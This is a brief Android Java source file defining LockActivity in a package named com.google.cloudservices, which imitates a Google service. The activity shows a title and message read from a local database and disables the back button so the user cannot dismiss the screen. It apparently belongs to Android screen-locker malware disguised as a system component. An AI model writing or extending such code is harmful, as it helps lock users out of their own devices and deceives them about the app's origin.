package com.google.cloudservices;

import android.app.Activity;
import android.os.Bundle;
import android.widget.TextView;
public class LockActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_lock);

        TextView txttitle=(TextView)findViewById(R.id.txttitle);
        TextView txttext=(TextView)findViewById(R.id.txttext);
        LockTitleDB lockTitleDB=new LockTitleDB(LockActivity.this);
        lockTitleDB.gettitle();
        txttitle.setText(lockTitleDB.title1);
        txttext.setText(lockTitleDB.text1);
    }

    @Override
    public void onBackPressed() {

    }
}
